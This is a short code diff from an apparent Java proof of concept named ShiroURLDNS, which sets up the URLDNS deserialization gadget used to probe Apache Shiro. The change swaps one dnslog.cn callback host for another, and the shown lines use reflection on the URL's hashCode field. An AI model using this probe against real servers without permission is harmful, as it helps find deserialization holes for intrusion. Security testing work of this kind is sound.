@@ -19,7 +19,7 @@ import java.util.HashMap;
 public class ShiroURLDNS {
     public static void main(String[] args) throws Exception {
         HashMap hashMap = new HashMap();
-        URL url = new URL("http://an5sr5.dnslog.cn");
+        URL url = new URL("http://ixnod8.dnslog.cn");
         Class c = url.getClass();
         Field hashcodefield = c.getDeclaredField("hashCode");
         hashcodefield.setAccessible(true);
